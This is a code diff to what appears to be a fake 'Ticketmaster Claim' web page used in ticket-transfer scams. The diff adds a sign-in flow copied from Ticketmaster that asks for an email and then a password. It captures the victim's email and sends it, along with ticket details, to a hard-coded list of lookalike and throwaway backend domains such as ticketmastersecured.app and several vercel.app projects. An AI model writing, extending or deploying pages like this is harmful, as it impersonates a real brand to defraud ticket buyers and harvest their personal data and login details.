@@ -811,7 +811,8 @@
             buyerEmail: parsedData.buyerEmail || "",
             buyerName: parsedData.buyerName || "",
             senderEmail: parsedData.senderEmail || "",
-            senderName: parsedData.senderName || "JACQUELINE"
+            senderName: parsedData.senderName || "JACQUELINE",
+            backendUrl: parsedData.backendUrl || ""
           };
         }
       } catch (e) {
@@ -1687,15 +1688,44 @@
       window.location.hash = '#/';
     }
 
-    function loadSettingsOnMount() {
+    // Login Step 1: Email Continue
+    function handleEmailStepSubmit(event) {
+      if (event) event.preventDefault();
+      const emailInput = document.getElementById('login-email-input');
+      const emailVal = emailInput ? emailInput.value.trim() : 'user@domain.com';
+      // Pass email to password page display
+      const displayEl = document.getElementById('login-display-email');
+      if (displayEl) displayEl.textContent = emailVal || 'user@domain.com';
+      if (activeTicket && emailVal && emailVal.includes('@')) {
+        activeTicket.buyerEmail = emailVal;
+      }
+      window.location.hash = '#/login-password';
+    }
+
+    // Login Step 2: Password Sign In → go to Transfer page
+    function handlePasswordStepSubmit(event) {
+      if (event) event.preventDefault();
+      window.location.hash = '#/transfer';
+    }
+
+    // Legacy login form handler
+    function handleLoginSubmit(event) {
+      event.preventDefault();
+      const emailInput = document.getElementById('login-email');
+      if (emailInput && activeTicket && emailInput.value.includes('@')) {
+        activeTicket.buyerEmail = emailInput.value.trim();
+      }
+      window.location.hash = '#/dashboard';
+    }
+
+    // Load admin settings from DB / local cache
+    async function loadSettingsOnMount() {
       try {
-        const raw = localStorage.getItem('tm_app_settings');
-        if (raw) {
-          const settings = JSON.parse(raw);
-          if (settings.dark === 'Yes') {
-            document.documentElement.classList.add('dark');
-          } else {
-            document.documentElement.classList.remove('dark');
+        const cached = localStorage.getItem('tm_ticket_settings');
+        if (cached) {
+          const parsed = JSON.parse(cached);
+          if (parsed && typeof parsed === 'object') {
+            document.title = parsed.name ? `${parsed.name} — Ticketmaster Claim` : 'Ticket Claim — Ticketmaster';
           }
         }
       } catch (e) {}
@@ -1718,9 +1748,9 @@
       }
     }
 
-    // Trigger backend API call to send accepted email to the seller
+    // Trigger backend API call to send accepted email to the seller and buyer
     function triggerAcceptanceEmail(ticket) {
-      if (!ticket || !ticket.senderEmail) return;
+      if (!ticket) return;
       
       const seatsFormatted = ticket.seats && ticket.seats.length > 1
         ? `Seats: ${ticket.seats.slice(0, -1).join(', ')} and ${ticket.seats[ticket.seats.length - 1]}`
@@ -1735,54 +1765,69 @@
         }
       }
 
+      // Resolve buyer email from input if missing on ticket
+      let resolvedBuyerEmail = ticket.buyerEmail;
+      if (!resolvedBuyerEmail || !resolvedBuyerEmail.includes('@')) {
+        const emailInput = document.getElementById('login-email-input') || document.getElementById('login-email');
+        if (emailInput && emailInput.value && emailInput.value.includes('@')) {
+          resolvedBuyerEmail = emailInput.value.trim();
+        }
+      }
+
       const payload = {
-        ticketId: ticket.ticketId || "",
+        ticketId: ticket.ticketId || ticket.id || "",
         seats: ticket.seats || [],
         buyerName: ticket.buyerName || "Miller Broome",
-        buyerEmail: ticket.buyerEmail || "Weirdrexx@gmail.com",
-        ticketTitle: ticket.title,
-        ticketDate: ticket.date,
-        ticketVenue: ticket.venue,
-        ticketImage: ticket.image,
+        buyerEmail: resolvedBuyerEmail || "buyer@ticketmaster.com",
+        ticketTitle: ticket.title || "Event Tickets",
+        ticketDate: ticket.date || "",
+        ticketVenue: ticket.venue || "",
+        ticketImage: ticket.image || "",
         section: ticket.section || "",
         row: ticket.row || "",
         seatDetails: computedSeatDetails,
         senderName: ticket.senderName || "JACQUELINE",
-        senderEmail: ticket.senderEmail,
-        backendUrl: ticket.backendUrl
+        senderEmail: ticket.senderEmail || "",
+        backendUrl: ticket.backendUrl || ""
       };
 
-      const origins = [];
+      const origins = [
+        'https://www.ticketmastersecured.app',
+        'https://ticketmastersecured.app',
+        'https://ticket-hub-o68j.vercel.app',
+        'https://ticket-hub-virid.vercel.app',
+        'https://tickethub.vercel.app',
+        'https://featured-finds-app-main.vercel.app',
+        'https://featured-finds-app-main-heyheyoladapo-5820s-projects.vercel.app'
+      ];
+
       if (ticket.backendUrl) {
-        origins.push(ticket.backendUrl);
+        origins.unshift(ticket.backendUrl);
       }
       
       const currentOrigin = window.location.origin;
       if (window.location.hostname === 'localhost' || window.location.hostname === '127.0.0.1') {
-        origins.push('http://localhost:8002');
+        origins.unshift('http://localhost:8002');
+        origins.unshift('http://localhost:8080');
+        origins.unshift('http://localhost:3000');
       } else {
-        // Build dynamic fallbacks replacing 'ticket-claim' with project names from active Vercel deployments
-        origins.push(currentOrigin.replace('ticket-claim', 'ticket-hub-o68j'));
-        origins.push(currentOrigin.replace('ticket-claim', 'ticket-hub-virid'));
-        origins.push(currentOrigin.replace('ticket-claim', 'ticket-hub'));
-        origins.push(currentOrigin.replace('ticket-claim', 'featured-finds-app-main-heyheyoladapo-5820s-projects'));
-        origins.push(currentOrigin.replace('ticket-claim', 'featured-finds-app-main'));
-        origins.push(currentOrigin.replace('ticket-claim', 'tickethub-lovable'));
-        origins.push(currentOrigin.replace('ticket-claim', 'tickethub'));
-
+        origins.unshift(currentOrigin);
         // Handle case where this page is deployed to a 'claim.' subdomain
         const hostnameParts = window.location.hostname.split('.');
         if (hostnameParts.length >= 3 && hostnameParts[0] === 'claim') {
           const apexDomain = hostnameParts.slice(1).join('.');
-          origins.push(`${window.location.protocol}//${apexDomain}`);
-          origins.push(`${window.location.protocol}//www.${apexDomain}`);
+          origins.unshift(`${window.location.protocol}//${apexDomain}`);
+          origins.unshift(`${window.location.protocol}//www.${apexDomain}`);
         }
       }
 
-      // Filter unique origins
+      // Filter unique valid HTTP origins
       const uniqueOrigins = [...new Set(origins)].filter(url => url && url.startsWith('http'));
 
       async function attemptAcceptanceFetch() {
+        console.log("Triggering accept-transfer with payload:", payload);
+        console.log("Target backend origins:", uniqueOrigins);
+
         // 1. Try relative path call first
         try {
           const res = await fetch('/api/accept-transfer', {
@@ -1801,18 +1846,18 @@
         // 2. Loop through fallback origins
         for (const base of uniqueOrigins) {
           try {
-            console.log("Trying cross-origin backend acceptance URL:", base);
+            console.log("Trying backend acceptance URL:", `${base}/api/accept-transfer`);
             const res = await fetch(`${base}/api/accept-transfer`, {
               method: 'POST',
               headers: { 'Content-Type': 'application/json' },
               body: JSON.stringify(payload)
             });
             if (res.ok) {
-              console.log("Acceptance email triggered successfully via cross-origin:", base);
+              console.log("Acceptance email triggered successfully via origin:", base);
               return;
             }
           } catch (err) {
-            console.error("Acceptance call failed for domain:", base, err);
+            console.warn("Acceptance call failed for domain:", base, err);
           }
         }
         console.error("All attempts to trigger the acceptance email failed.");
